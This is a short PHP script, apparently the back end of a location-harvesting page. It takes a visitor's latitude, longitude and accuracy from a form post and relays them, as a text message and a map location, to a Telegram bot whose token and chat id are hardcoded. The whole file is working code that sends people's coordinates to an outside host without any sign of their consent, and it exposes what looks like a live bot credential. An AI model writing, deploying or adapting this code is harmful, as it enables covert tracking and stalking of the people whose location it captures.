<?php 
if(isset($_POST['lat'])){
    

$lat = urldecode($_POST['lat']);
$lon = urldecode($_POST['lon']);
$acc = urldecode($_POST['acc']);

$botToken = "6780846651:AAFaeMiJfbHlLdTtFYjd2i_xLULXBToUZMk";
$chat_id = "1992587266";
$message = "
Latitude: : $lat \n
Longitude: $lon \n
Accuracy: $acc meters";
$bot_url    = "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);


$boturl = "https://api.telegram.org/bot$botToken/sendlocation?chat_id=$chat_id&latitude=$lat&longitude=$lon";

file_get_contents($boturl);

}
?>